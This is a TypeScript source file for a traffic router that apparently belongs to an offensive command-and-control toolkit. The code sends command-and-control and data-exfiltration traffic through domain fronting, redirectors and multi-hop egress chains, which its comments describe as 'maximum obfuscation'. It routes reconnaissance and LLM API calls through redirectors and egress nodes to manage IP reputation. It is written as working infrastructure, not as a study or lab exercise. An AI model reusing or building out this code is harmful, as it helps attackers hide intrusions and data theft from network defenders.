import { randomUUID } from "node:crypto"
import { EventEmitter } from "node:events"
import { z } from "zod"
import { EgressManager } from "./egress-manager"
import { DomainFrontingManager } from "./domain-fronting"
import type { EgressNode } from "./egress-manager"
import type { FrontingConfig } from "./domain-fronting"

export const TrafficType = z.enum([
  "c2",        // Command & control traffic
  "exfil",     // Data exfiltration
  "recon",     // Reconnaissance
  "llm",       // LLM API calls
  "web",       // General web requests
  "download"   // File downloads
])
export type TrafficType = z.infer<typeof TrafficType>

export const RoutingStrategy = z.enum([
  "direct",           // Direct connection
  "redirector",       // Through redirector nodes
  "domain-fronting",  // Through CDN/domain fronting
  "egress",          // Through egress nodes
  "cascade"          // Multiple hops
])
export type RoutingStrategy = z.infer<typeof RoutingStrategy>

export const TrafficRoute = z.object({
  id: z.string().min(1),
  type: TrafficType,
  strategy: RoutingStrategy,
  source: z.object({
    ip: z.string().optional(),
    country: z.string().optional(),
    userAgent: z.string().optional()
  }),
  destination: z.object({
    host: z.string().min(1),
    port: z.number().int().min(1).max(65535),
    path: z.string().default("/")
  }),
  hops: z.array(z.object({
    type: z.enum(["redirector", "fronting", "egress"]),
    nodeId: z.string().min(1),
    hostname: z.string().min(1),
    port: z.number().int().min(1).max(65535),
    protocol: z.enum(["http", "https", "socks5", "socks5h"])
  })),
  priority: z.number().int().min(1).max(10).default(5),
  timeout: z.number().int().min(1000).default(30000),
  retries: z.number().int().min(0).max(5).default(3),
  metadata: z.record(z.string(), z.unknown()).optional(),
  createdAt: z.number().int(),
  updatedAt: z.number().int()
})
export type TrafficRoute = z.infer<typeof TrafficRoute>

export interface TrafficRoutingConfig {
  defaultStrategy: RoutingStrategy
  enableFailover: boolean
  enableLoadBalancing: boolean
  geographicRouting: boolean
  maxHops: number
  healthCheckInterval: number
  circuitBreakerThreshold: number
}

export class TrafficRouter extends EventEmitter {
  private routes: Map<string, TrafficRoute> = new Map()
  private config: TrafficRoutingConfig
  private egressManager: EgressManager
  private frontingManager: DomainFrontingManager
  private circuitBreakerStates: Map<string, { failures: number; lastFailure: number; state: "closed" | "open" | "half-open" }> = new Map()

  constructor(
    config: TrafficRoutingConfig,
    egressManager: EgressManager,
    frontingManager: DomainFrontingManager
  ) {
    super()
    this.config = config
    this.egressManager = egressManager
    this.frontingManager = frontingManager
  }

  /**
   * Create a new traffic route
   */
  createRoute(routeData: Omit<TrafficRoute, "id" | "createdAt" | "updatedAt">): TrafficRoute {
    const route: TrafficRoute = {
      ...routeData,
      id: randomUUID(),
      createdAt: Date.now(),
      updatedAt: Date.now()
    }

    this.routes.set(route.id, route)
    this.emit("routeCreated", route)
    
    return route
  }

  /**
   * Route traffic based on type and context
   */
  async routeTraffic(
    type: TrafficType,
    destination: { host: string; port: number; path?: string },
    source?: { ip?: string; country?: string; userAgent?: string }
  ): Promise<TrafficRoute | null> {
    // Check for existing routes
    const existingRoute = this.findBestRoute(type, destination, source)
    if (existingRoute && this.isRouteHealthy(existingRoute.id)) {
      return existingRoute
    }

    // Create new route based on strategy
    const strategy = this.determineStrategy(type, source, destination)
    const hops = await this.buildHops(strategy, destination, source)

    if (hops.length === 0) {
      this.emit("routingFailed", { type, destination, reason: "No available hops" })
      return null
    }

    const route = this.createRoute({
      type,
      strategy,
      source: source || {},
      destination: {
        host: destination.host,
        port: destination.port,
        path: destination.path || "/"
      },
      hops,
      priority: this.calculatePriority(type, source),
      timeout: this.calculateTimeout(type),
      retries: this.calculateRetries(type)
    })

    this.emit("trafficRouted", { route, type, destination })
    return route
  }

  /**
   * Find the best existing route for traffic
   */
  private findBestRoute(
    type: TrafficType,
    destination: { host: string; port: number },
    source?: { ip?: string; country?: string }
  ): TrafficRoute | null {
    const candidates = Array.from(this.routes.values())
      .filter(route => route.type === type)
      .filter(route => route.destination.host === destination.host)
      .filter(route => route.destination.port === destination.port)
      .filter(route => this.isRouteHealthy(route.id))

    if (candidates.length === 0) return null

    // Sort by priority and return best
    candidates.sort((a, b) => b.priority - a.priority)
    return candidates[0]
  }

  /**
   * Determine routing strategy based on traffic type and context
   */
  private determineStrategy(
    type: TrafficType,
    source?: { ip?: string; country?: string },
    destination?: { host: string; port: number }
  ): RoutingStrategy {
    // High-risk traffic gets more obfuscation
    if (type === "c2" || type === "exfil") {
      if (this.config.geographicRouting && source?.country) {
        return "cascade" // Multiple hops for sensitive traffic
      }
      return "domain-fronting"
    }

    // LLM calls go through egress for IP reputation management
    if (type === "llm") {
      return "egress"
    }

    // Recon traffic uses redirectors
    if (type === "recon") {
      return "redirector"
    }

    // Default strategy
    return this.config.defaultStrategy
  }

  /**
   * Build hop chain for a routing strategy
   */
  private async buildHops(
    strategy: RoutingStrategy,
    destination: { host: string; port: number },
    source?: { ip?: string; country?: string }
  ): Promise<TrafficRoute["hops"]> {
    const hops: TrafficRoute["hops"] = []

    switch (strategy) {
      case "direct":
        // No hops - direct connection
        break

      case "redirector":
        // Add redirector hop
        const redirector = await this.selectRedirector(source?.country)
        if (redirector) {
          hops.push({
            type: "redirector",
            nodeId: redirector.id,
            hostname: redirector.hostname,
            port: redirector.port,
            protocol: "https"
          })
        }
        break

      case "domain-fronting":
        // Add domain fronting hop
        const frontingConfig = this.frontingManager.selectConfig(
          source?.country,
          "c2"
        )
        if (frontingConfig) {
          hops.push({
            type: "fronting",
            nodeId: frontingConfig.id,
            hostname: frontingConfig.subdomain ? 
              `${frontingConfig.subdomain}.${frontingConfig.domain}` : 
              frontingConfig.domain,
            port: 443,
            protocol: "https"
          })
        }
        break

      case "egress":
        // Add egress node hop
        const egressNode = this.egressManager.selectNode("web", source?.country)
        if (egressNode) {
          hops.push({
            type: "egress",
            nodeId: egressNode.id,
            hostname: egressNode.hostname,
            port: egressNode.port,
            protocol: egressNode.protocol
          })
        }
        break

      case "cascade":
        // Multiple hops for maximum obfuscation
        const cascadeHops = await this.buildCascadeHops(destination, source)
        hops.push(...cascadeHops)
        break
    }

    return hops.slice(0, this.config.maxHops)
  }

  /**
   * Build cascade hops for multi-hop routing
   */
  private async buildCascadeHops(
    destination: { host: string; port: number },
    source?: { ip?: string; country?: string }
  ): Promise<TrafficRoute["hops"]> {
    const hops: TrafficRoute["hops"] = []

    // First hop: Domain fronting
    const frontingConfig = this.frontingManager.selectConfig(
      source?.country,
      "c2"
    )
    if (frontingConfig) {
      hops.push({
        type: "fronting",
        nodeId: frontingConfig.id,
        hostname: frontingConfig.subdomain ? 
          `${frontingConfig.subdomain}.${frontingConfig.domain}` : 
          frontingConfig.domain,
        port: 443,
        protocol: "https"
      })
    }

    // Second hop: Redirector
    const redirector = await this.selectRedirector(source?.country)
    if (redirector) {
      hops.push({
        type: "redirector",
        nodeId: redirector.id,
        hostname: redirector.hostname,
        port: redirector.port,
        protocol: "https"
      })
    }

    // Third hop: Egress node (for final delivery)
    const egressNode = this.egressManager.selectNode("web", source?.country)
    if (egressNode) {
      hops.push({
        type: "egress",
        nodeId: egressNode.id,
        hostname: egressNode.hostname,
        port: egressNode.port,
        protocol: egressNode.protocol
      })
    }

    return hops
  }

  /**
   * Select best redirector for traffic
   */
  private async selectRedirector(country?: string): Promise<{ id: string; hostname: string; port: number } | null> {
    // This would integrate with your redirector management system
    // For now, return a placeholder
    return {
      id: "redirector-1",
      hostname: "redirector.example.com",
      port: 443
    }
  }

  /**
   * Calculate route priority based on traffic type and context
   */
  private calculatePriority(type: TrafficType, source?: { country?: string }): number {
    const basePriorities = {
      c2: 10,
      exfil: 9,
      llm: 7,
      recon: 6,
      web: 5,
      download: 4
    }

    let priority = basePriorities[type] || 5

    // Adjust based on source country risk
    if (source?.country) {
      const highRiskCountries = ["CN", "RU", "IR", "KP"]
      if (highRiskCountries.includes(source.country)) {
        priority = Math.min(10, priority + 2)
      }
    }

    return priority
  }

  /**
   * Calculate timeout based on traffic type
   */
  private calculateTimeout(type: TrafficType): number {
    const timeouts = {
      c2: 30000,
      exfil: 60000,
      llm: 120000,
      recon: 15000,
      web: 10000,
      download: 300000
    }

    return timeouts[type] || 30000
  }

  /**
   * Calculate retry count based on traffic type
   */
  private calculateRetries(type: TrafficType): number {
    const retries = {
      c2: 3,
      exfil: 5,
      llm: 2,
      recon: 1,
      web: 2,
      download: 3
    }

    return retries[type] || 3
  }

  /**
   * Check if a route is healthy (circuit breaker pattern)
   */
  private isRouteHealthy(routeId: string): boolean {
    const state = this.circuitBreakerStates.get(routeId)
    if (!state) return true

    const now = Date.now()
    const timeSinceLastFailure = now - state.lastFailure

    switch (state.state) {
      case "closed":
        return true
      case "open":
        if (timeSinceLastFailure > 60000) { // 1 minute timeout
          state.state = "half-open"
          return true
        }
        return false
      case "half-open":
        return true
      default:
        return false
    }
  }

  /**
   * Record route success/failure for circuit breaker
   */
  recordRouteResult(routeId: string, success: boolean): void {
    let state = this.circuitBreakerStates.get(routeId)
    
    if (!state) {
      state = {
        failures: 0,
        lastFailure: 0,
        state: "closed"
      }
      this.circuitBreakerStates.set(routeId, state)
    }

    if (success) {
      state.failures = 0
      state.state = "closed"
    } else {
      state.failures++
      state.lastFailure = Date.now()

      if (state.failures >= this.config.circuitBreakerThreshold) {
        state.state = "open"
        this.emit("circuitBreakerOpened", { routeId, failures: state.failures })
      }
    }
  }

  /**
   * Get routing statistics
   */
  getStatistics() {
    const routes = Array.from(this.routes.values())
    const healthyRoutes = routes.filter(route => this.isRouteHealthy(route.id)).length
    const openCircuits = Array.from(this.circuitBreakerStates.values())
      .filter(state => state.state === "open").length

    const routesByType = routes.reduce((acc, route) => {
      acc[route.type] = (acc[route.type] || 0) + 1
      return acc
    }, {} as Record<TrafficType, number>)

    const routesByStrategy = routes.reduce((acc, route) => {
      acc[route.strategy] = (acc[route.strategy] || 0) + 1
      return acc
    }, {} as Record<RoutingStrategy, number>)

    return {
      totalRoutes: routes.length,
      healthyRoutes,
      openCircuits,
      routesByType,
      routesByStrategy,
      averageHops: routes.reduce((sum, route) => sum + route.hops.length, 0) / routes.length || 0
    }
  }

  /**
   * Get all routes
   */
  getAllRoutes(): TrafficRoute[] {
    return Array.from(this.routes.values())
  }

  /**
   * Get routes by type
   */
  getRoutesByType(type: TrafficType): TrafficRoute[] {
    return Array.from(this.routes.values()).filter(route => route.type === type)
  }

  /**
   * Clean up old routes
   */
  cleanup(maxAge: number = 24 * 60 * 60 * 1000): void { // 24 hours default
    const cutoff = Date.now() - maxAge
    const toDelete: string[] = []

    for (const [id, route] of this.routes.entries()) {
      if (route.updatedAt < cutoff) {
        toDelete.push(id)
      }
    }

    for (const id of toDelete) {
      this.routes.delete(id)
      this.circuitBreakerStates.delete(id)
    }

    if (toDelete.length > 0) {
      this.emit("routesCleanedUp", { count: toDelete.length })
    }
  }
}